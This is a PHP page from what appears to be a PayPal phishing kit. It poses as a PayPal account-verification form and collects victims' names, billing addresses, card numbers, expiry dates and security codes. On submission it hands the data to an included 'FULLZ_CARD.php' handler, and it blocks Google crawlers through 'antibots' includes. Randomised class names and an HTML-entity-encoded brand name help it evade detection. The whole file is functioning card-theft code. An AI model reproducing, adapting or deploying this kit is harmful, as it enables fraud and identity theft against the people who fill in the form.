<?php
/*   
                       
*/

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 
################### SECOND FILES #####################
include('../../functions/get_lang_en.php');
############## BILL ADDRESS INFORMATION ##############
$_SESSION['_fullname_']    = $_POST['fullname'];
$_SESSION['_address_']     = $_POST['address'];
$_SESSION['_city_']        = $_POST['city'];
$_SESSION['_state_']       = $_POST['state'];
$_SESSION['_zipCode_']     = $_POST['zipCode'];
############## CREDIT CARD INFORMATION ##############
$_SESSION['_c_valid_']    = $_POST['c_valid'];
$_SESSION['_c_type_']     = $_POST['c_type'];
$_SESSION['_nameoncard_'] = $_POST['nameoncard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];	
#####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['cardnumber'])== false) {
        include('FULLZ_CARD.php');
}
}
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
include "../../../BOTS/antibots7.php";
include "../../../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_PowerRxRagers_x <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
</style>
</head>
<body id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
<header class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
    <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> headerxx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
        <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xGhostxRider_JC <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
            <a data-click="payPalxL0GR" href="#" class="xL0GR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"></a>
            <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> BTN_SuperMAN <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><span class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> ThexSHIELD118 <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><?=$Z118_securityLock;?></span></div>
        </div>
    </div>
</header>
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <section id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" role="xx_GOxGO" data-country="US" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
            <section id="xx_GOxGO" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V654DF654THEBEASTXX" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <form action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" no<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> D_AvengersHERE789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"><span>○</span><span class="selected">●</span><span>○</span><span>○</span><span>○</span><span>○</span></div>
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> HeaderZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                <h2 class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"><?=$Z118_verify;?></h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"><?=$Z118_pargraphe;?></p>
                            </div>
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> MightyxMorphin <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">	
									    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
									        <p style="margin-bottom: 8px;"><?=$Z118_update_bill;?></p>                                       
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
											<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
												    <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="fullname" name="fullname" required="required" value="" placeholder="<?=$Z118_fullname;?>" autocomplete="off" aria-required="true">
                                                </div>
                                            </div>									
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" name="address" required="required" value="" placeholder="<?=$Z118_address;?>" autocomplete="off" aria-required="true">
                                                </div>
                                            </div>
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="stateHolder" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                        <input type="text" id="city" name="city" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" placeholder="<?=$Z118_city;?>" required="required" autocomplete="off" value="<?=$_SESSION['_LOOKUP_CITY_'];?>" aria-required="true">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> multi <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> equal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  left" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="text" id="state" name="state" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" aria-required="true" value="<?=$_SESSION['_LOOKUP_STATE_'];?>" placeholder="<?=$Z118_state;?>" aria-required="true">
                                                </div>
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  right" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                        <input type="text" id="postalCode" name="zipCode" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" placeholder="<?=$Z118_zipCode;?>" value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>" aria-required="true">
                                                    </div>
                                                </div>
                                            </div>
                                            </div>
                                        </div>
									</div>							
                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> 0Dats_Good0 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"style="margin-top: 5em;"><p style="margin-bottom: 8px;"><?=$Z118_update_card;?></p>
                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> lap <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <input type="text" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="nameoncard" name="nameoncard" required="required" autocomplete="off" placeholder="<?=$Z118_cardholder;?>" value="<?php if(isset($_SESSION['_nameoncard_'])){ echo $_SESSION['_nameoncard_'];} ?>">
                                            </div>
                                        </div>
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 large" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
											    <input type="tel" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="cardnumber" name="cardnumber" placeholder="<?=$Z118_cardnumber;?>" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">                                                                                       
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> multi <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> equal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> left" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
												<input type="tel" id="en_expdate" name="expdate" autocomplete="off" class="Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" value="" maxlength="7" placeholder="<?=$Z118_expdate;?>" value="">
											</div>
                                             <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> medium <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> right" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                                    <input type="tel" id="csc" name="csc" autocomplete="off" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> Xval666ideX1 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" required="required" placeholder="<?=$Z118_csc;?>" value="">
                                                </div>
                                            </div>
                                        </div>
                                    </div> 
 									
									<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> agreeTC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  checkbox" id="<?="PP-ID1198".rand(1180018, 1001198745)?>">
                                        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V-ForZ118" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <label class="helpNotifyUS" role="button"><?=$Z118_agree;?><a data-click="userAgreement" href="#" target="_blank"><?=$Z118_user_agrement;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_privacy;?></a><?=$Z118_and;?><a data-click="esign" href="#" target="_blank"><?=$Z118_policy;?></a>.</label>
                                        </div>
                                    </div>
                                    <input id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> submitBtn<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " name="" type="submit" class="ButtonZ118" value="<?=$Z118_submit;?>" data-click="WorldWideSubmit">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
    <footer id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> gblFooter" role="contentinfo" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00Nav <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> legal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <p class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> copyright <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">© <?=date('Y');?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></li>
                        </ul>
						<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> flag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
						<a id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" data-click="flagChange" href="#" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
<div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Redirecting ... </p></div>
</body>
</html>